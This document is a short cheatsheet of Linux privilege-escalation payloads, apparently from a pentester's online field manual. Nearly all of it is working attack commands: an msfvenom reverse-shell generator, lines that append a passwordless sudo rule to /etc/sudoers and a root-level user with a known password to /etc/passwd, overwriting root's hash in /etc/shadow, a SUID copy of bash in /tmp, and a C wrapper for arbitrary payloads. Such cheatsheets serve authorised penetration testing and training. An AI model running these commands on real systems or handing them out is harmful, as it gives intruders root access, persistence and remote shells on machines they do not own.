# Linux PrivEsc Payloads

## Cheatsheet

|Action|Description|
|---|---|
|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell.elf`|Generates a Linux x64 reverse TCP shell payload in ELF format.|
|`echo '<username> ALL=(root) NOPASSWD: ALL' >> /etc/sudoers`  <br>  <br>To get a `root` shell:  <br>`sudo su`|Grants a user passwordless root privileges via `sudo`.|
|`echo 'r00t:$1$H5CxLMip$oSqpK92MM5tNOjlQ0nkO80:0:0:root:/root:/bin/bash' >> /etc/passwd`  <br>  <br>[Writeable /etc/passwd](https://manual.brunorochamoura.com/manual/post-exploitation/linux-post-exploitation/linux-privilege-escalation/passwd--shadow/writeable-etc-passwd/)|Inserts a new user to `/etc/passwd` with `root` privileges.  <br>  <br>Credentials:  <br>`r00t`:`brm_53cur3_p455w0rd`|
|`cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash`  <br>  <br>To get a shell as `root`:  <br>`/tmp/rootbash -p`|Creates a copy of the bash binary with a SUID set.|
|`mkpasswd -m sha-512 <password>`  <br>`sed -i 's/^root:\(.*\):/root:<password-hash>:/' /etc/shadow`  <br>  <br>[Writeable /etc/shadow](https://manual.brunorochamoura.com/manual/post-exploitation/linux-post-exploitation/linux-privilege-escalation/passwd--shadow/writeable-etc-shadow/)|Tampers with `/etc/shadow` to replace a `root`’s password.|
|`#include <stdio.h>`  <br>`#include <stdlib.h>`  <br>  <br>`int main(){`  <br>`system("PAYLOAD HERE");`  <br>`return 0;`  <br>`}`|A minimal C program that executes a payload when run.  <br>  <br>Compile it to an `elf` executable with:  <br>`gcc <program>.c -o <executable>`|

## Related Articles: [](https://field-manual.brunorochamoura.com/manual/post-exploitation/linux-post-exploitation/linux-privilege-escalation/linux-privesc-payloads/#related-articles)

- [Reverse Shells](https://manual.brunorochamoura.com/manual/pre-exploitation/shells/reverse-shells/): For additional reverse shell payloads
# Tags
> #Linux-Post-Exploitation #Linux-Privesc #Payloads 